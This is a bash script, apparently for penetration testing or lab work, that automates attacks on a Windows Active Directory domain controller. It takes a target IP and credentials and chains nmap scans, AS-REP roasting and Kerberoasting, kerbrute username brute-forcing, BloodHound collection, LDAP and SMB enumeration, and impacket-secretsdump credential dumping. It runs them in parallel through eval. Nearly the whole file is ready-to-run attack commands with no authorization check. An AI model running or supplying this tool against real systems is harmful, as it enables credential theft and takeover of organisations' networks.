#!/bin/bash

# Ensure required tools are installed
REQUIRED_TOOLS=("crackmapexec" "enum4linux-ng" "impacket-GetADUsers" "impacket-GetNPUsers" "impacket-GetUserSPNs" \
"impacket-smbclient" "impacket-secretsdump" "bloodhound-python" "ldapdomaindump" "kerbrute" "smbmap" "windapsearch" "nmap")

for tool in "${REQUIRED_TOOLS[@]}"; do
    if ! command -v "$tool" &> /dev/null; then
        echo "[-] Error: $tool is not installed. Please install it before running install_tools.sh."
        exit 1
    fi
done

# Prompt for target IP, domains, and credentials
read -p "[+] Enter target Windows machine IP: " TARGET
read -p "[+] Enter primary domain (e.g., example.com): " PRIMARY_DOMAIN
read -p "[+] Enter additional domains (comma-separated, e.g., dc01.example.com,dc02.example.com) or press Enter to skip: " ADDITIONAL_DOMAINS
read -p "[+] Enter username (e.g., Administrator): " USERNAME
read -s -p "[+] Enter password: " PASSWORD
echo ""
OUTPUT_FILE="windows_enum_results.txt"

# Convert comma-separated domains into an array
IFS=',' read -r -a DOMAIN_LIST <<< "$ADDITIONAL_DOMAINS"

# Add domains to /etc/hosts
echo "[+] Adding $PRIMARY_DOMAIN and any additional domains to /etc/hosts..."
echo "$TARGET $PRIMARY_DOMAIN" | sudo tee -a /etc/hosts > /dev/null
for DOMAIN in "${DOMAIN_LIST[@]}"; do
    echo "$TARGET $DOMAIN" | sudo tee -a /etc/hosts > /dev/null
done

# Max concurrent scans
MAX_CONCURRENT_SCANS=5

# Clear previous results
echo "[+] Starting Windows/Active Directory Enumeration for: $PRIMARY_DOMAIN ($TARGET)" | tee "$OUTPUT_FILE"
echo "[+] Results will be saved in: $OUTPUT_FILE"
echo "[+] Limiting to $MAX_CONCURRENT_SCANS parallel scans..."
echo -e "\n==================== Windows/AD Enumeration Results ====================\n" > "$OUTPUT_FILE"

# **Nmap Scan for Windows & Active Directory Services**
NMAP_CMD="nmap -p 88,135,139,389,445,464,636,3268,3269,3389 --script=smb-enum-shares,smb-enum-users,smb-os-discovery,ldap-rootdse,ldap-search $TARGET"

echo "[+] Running Nmap scan for Windows & AD services..."
echo -e "\n==================== Nmap Scan ====================\n" | tee -a "$OUTPUT_FILE"
eval "$NMAP_CMD" 2>&1 | tee -a "$OUTPUT_FILE"
echo "[+] Finished: Nmap Scan"

# **Kerberos & Pre-Auth Enumeration First**
KERBEROS_CMD="impacket-GetNPUsers $PRIMARY_DOMAIN/ -dc-ip $TARGET -no-pass -usersfile /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
KERBRUTE_CMD="kerbrute userenum -d $PRIMARY_DOMAIN --dc $TARGET /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"

echo "[+] Running Kerberos Enumeration First..."
echo -e "\n==================== Kerberos Enumeration ====================\n" | tee -a "$OUTPUT_FILE"
eval "$KERBEROS_CMD" 2>&1 | tee -a "$OUTPUT_FILE"
eval "$KERBRUTE_CMD" 2>&1 | tee -a "$OUTPUT_FILE"
echo "[+] Finished: Kerberos Enumeration"

# **Parallel Windows/AD Enumeration Commands**
SCANS=(
    "enum4linux-ng -A -u $USERNAME -p '$PASSWORD' $TARGET"
    "crackmapexec smb $TARGET -u $USERNAME -p '$PASSWORD' --shares"
    "crackmapexec ldap $TARGET -u $USERNAME -p '$PASSWORD' --users"
    "impacket-GetADUsers $PRIMARY_DOMAIN/$USERNAME:'$PASSWORD' -dc-ip $TARGET"
    "impacket-GetUserSPNs $PRIMARY_DOMAIN/$USERNAME:'$PASSWORD' -dc-ip $TARGET"
    "impacket-smbclient $PRIMARY_DOMAIN/$USERNAME:'$PASSWORD'@$TARGET -no-pass -list"
    "impacket-secretsdump $PRIMARY_DOMAIN/$USERNAME:'$PASSWORD'@$TARGET"
    "bloodhound-python -u $USERNAME -p '$PASSWORD' -d $PRIMARY_DOMAIN -c All -dc $TARGET"
    "ldapdomaindump -u $USERNAME -p '$PASSWORD' -d $PRIMARY_DOMAIN -o ldap_results $TARGET"
    "windapsearch -u $USERNAME -p '$PASSWORD' -d $PRIMARY_DOMAIN -m all -t $TARGET"
    "smbmap -H $TARGET -u $USERNAME -p '$PASSWORD'"
)

# **Function to Run Scans in Parallel**
run_scan() {
    local scan="$1"
    local header="==================== $(echo "$scan" | cut -d' ' -f1-2) ===================="

    echo "[+] Running: $scan"
    echo -e "\n$header\n" | tee -a "$OUTPUT_FILE"

    # Run scan and append results
    eval "$scan" 2>&1 | tee -a "$OUTPUT_FILE"

    echo "[+] Finished: $scan"
}

# Start enumeration scans in parallel
ACTIVE_SCANS=()
for scan in "${SCANS[@]}"; do
    run_scan "$scan" &  # Run in the background
    ACTIVE_SCANS+=($!)  # Store PID

    # Limit concurrent scans
    while [ "$(jobs -r | wc -l)" -ge "$MAX_CONCURRENT_SCANS" ]; do
        sleep 2
    done
done

# Wait for all scans to finish
wait

echo "[+] Windows/AD Enumeration Completed. Results saved to: $OUTPUT_FILE"

